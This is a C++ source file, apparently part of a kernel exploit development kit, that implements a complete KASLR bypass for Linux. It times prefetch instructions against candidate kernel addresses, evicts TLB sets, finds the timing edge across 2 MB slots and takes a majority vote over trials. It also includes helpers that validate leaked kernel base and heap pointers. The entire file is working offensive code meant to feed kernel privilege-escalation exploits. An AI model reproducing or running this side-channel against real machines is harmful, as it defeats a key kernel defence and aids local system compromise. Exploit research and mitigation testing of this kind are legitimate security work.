// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <algorithm>
#include <cassert>
#include <limits>
#include <sched.h>
#include <stdint.h>
#include <optional>
#include <xdk/util/error.h>
#include <xdk/util/pwn_utils.h>
#include <stdio.h>
#include <iostream>
#include <sys/syscall.h>
#include <unistd.h>
#include <immintrin.h>
#include <string.h>

bool is_kaslr_base(uint64_t kbase_addr) {
    if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000)
        return false;
    return true;
}

uint64_t check_kaslr_base(uint64_t kbase_addr) {
    if (!is_kaslr_base(kbase_addr))
        throw ExpKitError("kernel base address (%p) is incorrect", kbase_addr);
    return kbase_addr;
}

uint64_t check_heap_ptr(uint64_t heap_leak) {
    if ((heap_leak & 0xFFFF000000000000) != 0xFFFF000000000000)
        throw ExpKitError("kernel heap address (%p) is incorrect", heap_leak);
    return heap_leak;
}

void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        throw errno_error("sched_setaffinity failed");
}

// The lowest possible base: 0xFFFFFFFF80000000 + CONFIG_PHYSICAL_START
const uint64_t KASLR_START = 0xFFFFFFFF81000000;

// The highest possible base.
const uint64_t KASLR_END = KASLR_START + 0x40000000;

// The KASLR slot size; equal to CONFIG_PHYSICAL_ALIGN
const uint64_t KASLR_SLOT_SIZE = 0x200000;

const int KASLR_MAX_ATTEMPTS = 100;
const int KASLR_REFINEMENT_BACKTRACK = 5;

uint64_t compute_median(std::vector<uint64_t> v) {
    assert(!v.empty() && "compute_median received an empty vector");
    size_t n = v.size() / 2;
    nth_element(v.begin(), v.begin() + n, v.end());
    return v[n];
}

uint64_t abs_diff(uint64_t a, uint64_t b) {
    return (a > b) ? (a - b) : (b - a);
}

uint64_t slot_to_addr(size_t slot);

std::optional<uint64_t> try_find_edge(const std::vector<uint64_t>& timings) {
    uint64_t median = compute_median(timings);
    uint64_t max_diff = 0;
    for (size_t slot = 0; slot < timings.size(); slot++) {
        uint64_t diff = abs_diff(timings[slot], median);
        if (diff > max_diff) {
            max_diff = diff;
        }
    }
    uint64_t threshold = max_diff / 2;

    for (size_t slot = 0; slot < timings.size(); slot++) {
        uint64_t diff = abs_diff(timings[slot], median);
        if (diff >= threshold) {
            return slot;
        }
    }

    return std::nullopt;
}

uint64_t slot_to_addr(size_t slot) {
    return KASLR_START + (slot * KASLR_SLOT_SIZE);
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile(
        "mfence\n\t"
        "rdtscp\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "rdtscp\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) void prefetch(uint64_t addr) {
    asm volatile(
        "prefetchnta (%0)\n\t"
        "prefetcht2 (%0)\n\t"
        :
        : "r" (addr));
}

uint64_t sidechannel(uint64_t addr) {
    uint64_t time = rdtsc_begin();
    prefetch(addr);
    uint64_t delta = rdtsc_end() - time;
    return delta;
}

#define _TLB_BUFFER_LENGTH (16 * 1024 * 1024)
static char _tlb_buffer1[_TLB_BUFFER_LENGTH] = {0};
static char _tlb_buffer2[_TLB_BUFFER_LENGTH] = {0};
volatile char* _tlb_l1e, *_tlb_l2s;

static char* _align_page_address(char *address, size_t align)
{
	uint64_t target = (uint64_t) address;
	uint64_t aligned;

	aligned = target + (align - (target & (align - 1)));

	return (char *)aligned;
}

static void evict_l1_tlb_set(size_t set)
{
	size_t index, i;
	volatile char *eviction, *p = _tlb_l1e;

	for (i = 0; i < 4; ++i) {
		index = (set + (i * 16)) << 12;
		eviction = (char *)((size_t) p | index);
		*eviction = 0x5A;
	}
}

static void evict_l2_tlb_set(size_t set)
{
	size_t index, i;
	volatile char *eviction, *p = _tlb_l2s;

	for (i = 0; i < 4; ++i) {
		index = (set + (i * 128)) << 12;
		eviction = (char *)((size_t) p | index);
		*eviction = 0x5A;
	}
}

static void evict_l1_tlb_all(void)
{
	for (size_t set = 0; set < 128; set++) {
		evict_l1_tlb_set(set);
	}
}

void tlb_flush(void) {
	for (size_t set = 0; set < 128; set++) {
		evict_l1_tlb_all();
		evict_l2_tlb_set(set);
	}

  asm volatile("lfence");
}

void tlb_init(void) {
  memset(_tlb_buffer1, 2, _TLB_BUFFER_LENGTH);
  memset(_tlb_buffer2, 2, _TLB_BUFFER_LENGTH);

	_tlb_l1e = _align_page_address((char*) &_tlb_buffer1, 0x40000);
	_tlb_l2s = _align_page_address((char*) &_tlb_buffer2, 0x40000);
}

void collect_timings(size_t start_slot, size_t end_slot, int samples, bool flush_tlb,
                     std::vector<std::vector<uint64_t>>& all_timings) {
    for (int i = 0; i < samples; i++) {
        for (size_t slot = start_slot; slot < end_slot; slot++) {
            uint64_t addr = slot_to_addr(slot);
            if (flush_tlb) {
                tlb_flush();
            }
            uint64_t timing = sidechannel(addr);
            all_timings[slot].push_back(timing);
        }
    }
}

std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(int samples) {
    size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
    std::vector<std::vector<uint64_t>> all_timings(slots);
    for (auto& t : all_timings) {
        t.reserve(samples);
    }

    // Step 1: Coarse scan without TLB flush
    collect_timings(0, slots, samples, false, all_timings);

    std::vector<uint64_t> timings(slots);
    for (size_t slot = 0; slot < slots; slot++) {
        timings[slot] = compute_median(all_timings[slot]);
    }

    std::optional<size_t> candidate_slot = try_find_edge(timings);
    
    // Step 2: Refinement with TLB flush
    if (candidate_slot.has_value()) {
        size_t refine_end = *candidate_slot + 1; // Inclusive of candidate
        size_t refine_start = 0;
        if (*candidate_slot > KASLR_REFINEMENT_BACKTRACK) {
            refine_start = *candidate_slot - KASLR_REFINEMENT_BACKTRACK;
        }

        // Clear previous timings for the refined range to avoid mixing data
        for (size_t slot = refine_start; slot < refine_end; slot++) {
            all_timings[slot].clear();
        }

        collect_timings(refine_start, refine_end, 1000, true, all_timings);

        // Recompute medians for refined slots
        for (size_t slot = refine_start; slot < refine_end; slot++) {
            timings[slot] = compute_median(all_timings[slot]);
        }
        
        // Final edge detection with mixed (refined + coarse) data
        candidate_slot = try_find_edge(timings);
    }

    if (candidate_slot.has_value()) {
        return {slot_to_addr(*candidate_slot), timings};
    }
    return {std::nullopt, timings};
}

std::optional<uint64_t> find_majority(const std::vector<std::optional<uint64_t>>& slots) {
    uint64_t candidate = 0;
    size_t count = 0;

    for (const auto& slot : slots) {
        if (count == 0) {
            if (slot.has_value()) {
                candidate = slot.value();
                count = 1;
            }
        } else {
            if (slot.has_value() && slot.value() == candidate) {
                count++;
            } else {
                count--;
            }
        }
    }

    size_t actual_count = 0;
    for (const auto& slot : slots) {
        if (slot.has_value() && slot.value() == candidate) {
            actual_count++;
        }
    }

    if (actual_count > slots.size() / 2) {
        return candidate;
    }
    return std::nullopt;
}

uint64_t leak_kaslr_base(int samples, int trials, std::vector<std::vector<uint64_t>>* debug_data) {
    tlb_init();
    std::vector<std::optional<uint64_t>> slots(trials);
    for (int attempt = 0; attempt < KASLR_MAX_ATTEMPTS; attempt++) {
        for (int trial = 0; trial < trials; trial++) {
            auto result = try_leak_kaslr_base(samples);
            slots[trial] = result.first;
            if (debug_data) {
                 debug_data->push_back(result.second);
            }
        }
        std::optional<uint64_t> slot = find_majority(slots);
        if (slot.has_value()) {
            return *slot;
        }
    }
    throw ExpKitError("Failed to leak KASLR base");
}